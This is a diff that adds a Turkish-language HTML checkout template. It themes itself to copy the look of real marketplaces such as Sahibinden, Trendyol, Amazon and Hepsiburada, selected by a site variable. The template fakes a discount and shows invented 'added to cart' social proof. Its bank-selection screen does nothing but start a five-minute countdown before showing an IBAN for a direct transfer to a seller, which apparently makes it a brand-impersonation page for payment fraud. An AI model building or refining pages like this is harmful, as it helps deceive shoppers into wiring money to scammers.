@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>{{ product.title }}</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+
+<style>
+:root{
+ --primary:#ff6000;
+ --dark:#111;
+ --bg:#f5f5f5;
+ --btn-radius:10px;
+ --font:Inter;
+}
+
+/* ===== SITE THEMES ===== */
+body.sahibinden{
+ --primary:#ffd400;
+ --bg:#fff;
+ --btn-radius:6px;
+ --font:Arial;
+}
+body.trendyol{
+ --primary:#f27a1a;
+ --font:Inter;
+}
+body.amazon{
+ --primary:#131921;
+ --bg:#fff;
+ --font:Roboto;
+}
+body.hepsiburada{
+ --primary:#ff6000;
+}
+body.n11{
+ --primary:#6a0dad;
+}
+body.letgo{
+ --primary:#5f00ff;
+}
+body.dolap{
+ --primary:#22c55e;
+}
+body.vodafone{
+ --primary:#e60000;
+}
+body.turkcellpasaj{
+ --primary:#00a0df;
+}
+
+body{
+ margin:0;
+ background:var(--bg);
+ font-family:var(--font),sans-serif;
+}
+
+/* ===== HEADER ===== */
+.topbar{
+ background:var(--primary);
+ color:#fff;
+ padding:12px 25px;
+ display:flex;
+ align-items:center;
+ justify-content:space-between;
+ font-weight:600;
+}
+
+.topbar input{
+ width:40%;
+ padding:8px 12px;
+ border:none;
+ border-radius:6px;
+}
+
+.container{
+ max-width:1200px;
+ margin:30px auto;
+ padding:0 20px;
+}
+
+.breadcrumb{
+ font-size:13px;
+ opacity:0.6;
+ margin-bottom:15px;
+}
+
+/* ===== GRID ===== */
+.grid{
+ display:grid;
+ grid-template-columns:1fr 420px;
+ gap:40px;
+}
+
+.card{
+ background:#fff;
+ padding:20px;
+ border-radius:12px;
+ box-shadow:0 5px 20px rgba(0,0,0,0.05);
+}
+
+.sticky{
+ position:sticky;
+ top:20px;
+ height:fit-content;
+}
+
+/* ===== GALLERY ===== */
+.gallery img{
+ width:100%;
+ border-radius:12px;
+}
+
+/* ===== PRODUCT RIGHT ===== */
+.price{
+ font-size:28px;
+ font-weight:700;
+ color:var(--primary);
+ margin:10px 0;
+}
+
+.old-price{
+ text-decoration:line-through;
+ opacity:0.5;
+ font-size:14px;
+}
+
+.discount{
+ background:#dc2626;
+ color:#fff;
+ font-size:12px;
+ padding:3px 6px;
+ border-radius:4px;
+ margin-left:5px;
+}
+
+.stock{
+ color:#16a34a;
+ font-weight:600;
+ font-size:14px;
+}
+
+.btn{
+ width:100%;
+ padding:14px;
+ border:none;
+ border-radius:var(--btn-radius);
+ font-weight:600;
+ font-size:16px;
+ cursor:pointer;
+ background:var(--primary);
+ color:#fff;
+ margin-top:15px;
+ transition:.2s;
+}
+
+.btn:hover{
+ transform:scale(1.02);
+}
+
+.info-box{
+ margin-top:15px;
+ font-size:14px;
+ line-height:1.6;
+}
+
+.social{
+ margin-top:10px;
+ font-size:13px;
+ color:#dc2626;
+}
+
+/* ===== SCREENS ===== */
+.screen{display:none;}
+.active{display:block;}
+
+/* ===== BANK ===== */
+.bank{
+ padding:12px;
+ border:1px solid #ddd;
+ border-radius:8px;
+ margin-bottom:10px;
+ cursor:pointer;
+}
+.bank:hover{
+ background:#f3f4f6;
+}
+
+/* ===== PAYMENT ===== */
+.countdown{
+ margin:20px 0;
+ font-size:22px;
+ font-weight:700;
+ color:#b91c1c;
+ background:#fee2e2;
+ padding:10px;
+ border-radius:8px;
+ text-align:center;
+}
+
+.iban-box{
+ margin-top:15px;
+ background:#f3f4f6;
+ padding:12px;
+ border-radius:8px;
+ font-size:14px;
+}
+
+/* ===== WAITING ===== */
+.waiting{
+ font-size:60px;
+ animation:pulse 1s infinite;
+}
+@keyframes pulse{
+ 0%{opacity:1}
+ 50%{opacity:.3}
+ 100%{opacity:1}
+}
+
+@media(max-width:900px){
+ .grid{grid-template-columns:1fr;}
+}
+</style>
+</head>
+
+<body class="{{ site }}">
+
+<div class="topbar">
+ <div>{{ site|capitalize }}</div>
+ <input placeholder="Ürün ara...">
+ <div>🛒 👤</div>
+</div>
+
+<!-- PRODUCT -->
+<div id="productScreen" class="active">
+<div class="container">
+
+<div class="breadcrumb">
+Anasayfa > {{ product.category or "Kategori" }} > {{ product.title }}
+</div>
+
+<div class="grid">
+
+<div class="card">
+{% if product.image %}
+<img src="{{ url_for('static', filename='uploads/' ~ product.image) }}">
+{% else %}
+<img src="https://via.placeholder.com/600x600">
+{% endif %}
+</div>
+
+<div class="card sticky">
+<h2>{{ product.title }}</h2>
+
+<div class="old-price">{{ product.price }} ₺</div>
+<div class="price">{{ product.price }} ₺
+<span class="discount">%10</span>
+</div>
+
+<div class="stock">Stokta var</div>
+
+<div class="social">
+Son 30 dakikada 4 kişi sepete ekledi
+</div>
+
+<button class="btn" onclick="goBank()">Sepeti Onayla</button>
+
+<div class="info-box">
+🚚 Tahmini Teslimat: 1-3 Gün<br>
+🔒 Güvenli Ödeme<br>
+✔ İade Garantisi
+</div>
+
+</div>
+</div>
+
+<div class="card" style="margin-top:30px;">
+<h3>Ürün Açıklaması</h3>
+<p>{{ product.description }}</p>
+</div>
+
+</div>
+</div>
+
+<!-- BANK -->
+<div id="bankScreen" class="screen container">
+<div class="card">
+<h2>Banka Seçimi</h2>
+<div class="bank" onclick="selectBank()">Garanti</div>
+<div class="bank" onclick="selectBank()">Akbank</div>
+<div class="bank" onclick="selectBank()">Ziraat</div>
+<button class="btn" onclick="show('productScreen')">Geri</button>
+</div>
+</div>
+
+<!-- PAYMENT -->
+<div id="paymentScreen" class="screen container">
+<div class="card">
+
+<h2>Ödeme Bilgileri</h2>
+<p>Referans Kodunuz:</p>
+<h3 id="refCode"></h3>
+
+<div id="qr"></div>
+
+<div class="countdown" id="timer">05:00</div>
+
+{% if product.iban %}
+<div class="iban-box">
+Alıcı: {{ product.seller_name }}<br>
+IBAN: <span id="ibanText">{{ product.iban }}</span>
+<button class="btn" onclick="copyIban()">IBAN Kopyala</button>
+</div>
+{% endif %}
+
+<button class="btn" onclick="goWaiting()">Ödeme Yaptım</button>
+
+</div>
+</div>
+
+<!-- WAITING -->
+<div id="waitingScreen" class="screen container">
+<div class="card" style="text-align:center;">
+<h2>Ödeme Bekleniyor</h2>
+<div class="waiting">⏳</div>
+<p>Lütfen referans kodu ile işlemi tamamlayın.</p>
+<button class="btn" onclick="location.reload()">Başa Dön</button>
+</div>
+</div>
+
+<script>
+function show(id){
+document.querySelectorAll(".active,.screen")
+.forEach(e=>e.classList.remove("active"));
+document.getElementById(id).classList.add("active");
+window.scrollTo(0,0);
+}
+
+function goBank(){show("bankScreen");}
+
+function selectBank(){
+generateRef();
+startTimer(300);
+generateQR();
+show("paymentScreen");
+}
+
+function generateRef(){
+let ref="BB-"+Math.random().toString(36).substring(2,8).toUpperCase();
+document.getElementById("refCode").innerText=ref;
+}
+
+function generateQR(){
+QRCode.toCanvas(document.createElement('canvas'),
+document.getElementById("refCode").innerText,
+(e,c)=>document.getElementById("qr").appendChild(c));
+}
+
+function startTimer(sec){
+let interval=setInterval(()=>{
+let m=Math.floor(sec/60);
+let s=sec%60;
+timer.innerText=(m<10?"0":"")+m+":"+(s<10?"0":"")+s;
+sec--;
+if(sec<0){clearInterval(interval);timer.innerText="Süre Doldu";}
+},1000);
+}
+
+function goWaiting(){show("waitingScreen");}
+
+function copyIban(){
+let iban=document.getElementById("ibanText").innerText;
+navigator.clipboard.writeText(iban);
+alert("IBAN kopyalandı");
+}
+</script>
+
+</body>
+</html>
